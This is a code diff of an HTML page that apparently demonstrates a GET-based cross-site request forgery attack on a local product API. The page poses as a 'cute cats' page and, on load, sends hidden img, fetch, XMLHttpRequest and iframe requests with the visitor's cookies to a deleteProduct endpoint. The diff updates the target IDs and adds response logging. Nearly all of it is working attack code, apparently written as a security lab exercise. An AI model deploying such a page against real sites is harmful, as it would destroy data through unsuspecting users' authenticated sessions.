@@ -20,42 +20,65 @@
         <h2>Loading cute cats...</h2>
         
         <!-- Malicious img tag that triggers a GET request -->
-        <img src="http://localhost:3000/api/deleteProduct/684c18d67d2a35ef60c05304" 
+        <img src="http://localhost:3000/api/deleteProduct/684ea591f7b59e8d2c44a849" 
              style="display:none" 
              onerror="console.log('Product deletion attempted via img tag')">
         
         <!-- Malicious script tag that triggers a GET request -->
         <script>
             // This will execute when the page loads
-            fetch('http://localhost:3000/api/deleteProduct/684c18d67d2a35ef60c05304', {
+            fetch('http://localhost:3000/api/deleteProduct/684ea591f7b59e8d2c44a849', {
+                method: 'GET',
                 credentials: 'include'  // Include cookies in the request
-            }).then(() => console.log('Product deletion attempted via script tag'));
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.text();
+            })
+            .then(data => console.log('Product deletion response:', data))
+            .catch(error => console.error('Error:', error));
         </script>
 
         <!-- Fake cat images to make the page look legitimate -->
         <img src="../FrontEnd/src/images/cat1.jpg" width="200" alt="Cute cat 1">
-
         <img src="../FrontEnd/src/images/cat2.jpg" width="200" alt="Cute cat 2">
     </div>
 
     <script>
         // Additional demonstration of GET-based CSRF
         function demonstrateGetCsrf() {
+            console.log('Attempting CSRF attack...');
+            
             // Method 1: Using fetch
-            fetch('http://localhost:3000/api/deleteProduct/684e7ce6aae578598678b89f', {
+            fetch('http://localhost:3000/api/deleteProduct/684ea591f7b59e8d2c44a849', {
+                method: 'GET',
                 credentials: 'include'
-            });
+            })
+            .then(response => response.text())
+            .then(data => console.log('Fetch method response:', data))
+            .catch(err => console.error('Fetch error:', err));
 
             // Method 2: Using XMLHttpRequest
             const xhr = new XMLHttpRequest();
-            xhr.open('GET', 'http://localhost:3000/api/deleteProduct/684e7ce6aae578598678b89f', true);
+            xhr.open('GET', 'http://localhost:3000/api/deleteProduct/684ea591f7b59e8d2c44a849', true);
             xhr.withCredentials = true;
+            xhr.onload = function() {
+                console.log('XHR response:', xhr.responseText);
+            };
+            xhr.onerror = function() {
+                console.error('XHR error');
+            };
             xhr.send();
 
             // Method 3: Using an iframe
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
-            iframe.src = 'http://localhost:3000/api/deleteProduct/684e7ce6aae578598678b89f';
+            iframe.src = 'http://localhost:3000/api/deleteProduct/684ea591f7b59e8d2c44a849';
+            iframe.onload = function() {
+                console.log('Iframe loaded');
+            };
             document.body.appendChild(iframe);
         }
 
@@ -63,4 +86,4 @@
         window.onload = demonstrateGetCsrf;
     </script>
 </body>
-</html> 
+</html>
